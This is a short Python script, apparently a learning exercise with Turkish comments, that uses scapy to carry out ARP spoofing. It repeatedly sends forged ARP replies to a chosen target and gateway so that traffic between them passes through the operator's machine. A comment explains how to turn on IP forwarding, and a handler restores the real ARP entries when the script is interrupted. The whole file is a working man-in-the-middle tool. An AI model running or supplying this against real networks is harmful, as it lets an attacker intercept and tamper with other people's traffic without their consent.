import scapy.all as scapy
import time
import optparse

#echo 1 > /proc/sys/net/ipv4/ip_forward terminale yaz ip forwardingi 1 e eşle ki açık olsun

def get_mac_address(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	combined_packet = broadcast/arp_request
	answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]

	return answered_list[0][1].hwsrc

def arp_poison(target_ip,poisoned_ip):
	target_mac = get_mac_address((target_ip))
	arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
	scapy.send(arp_response, verbose=False)
#op=2 demek ARP cevabı al, default 1 dir gönder anlamına gelir.


def reset_operation(fooled_ip,gateway_ip):
	fooled_mac = get_mac_address((fooled_ip))

	gateway_mac = get_mac_address(gateway_ip)

	arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
	scapy.send(arp_response, verbose=False,count=4)

def get_user_input():
	parse_object = optparse.OptionParser()

	parse_object.add_option("-t" , "--target" , dest="target_ip" , help="Enter Target IP")
	parse_object.add_option("-g" , "--gateway" , dest="gateway_ip" , help="Enter Target IP")
	options = parse_object.parse_args()[0]

	if not options.target_ip:
		print("Enter Target IP")


	if not options.gateway_ip:
		print("Enter Gateway IP")

	return options
user_ips = get_user_input()

user_target_ip =user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip



number = 1
try:
	while True:
		arp_poison(user_target_ip,user_gateway_ip)
		arp_poison(user_gateway_ip,user_target_ip)
		print("\rSending packets "+ str(number),end="")

		number += 1
		time.sleep(3)
except KeyboardInterrupt:
	print("\nQuitting & Resetting")
	reset_operation(user_target_ip,user_gateway_ip)
	reset_operation(user_gateway_ip,user_target_ip)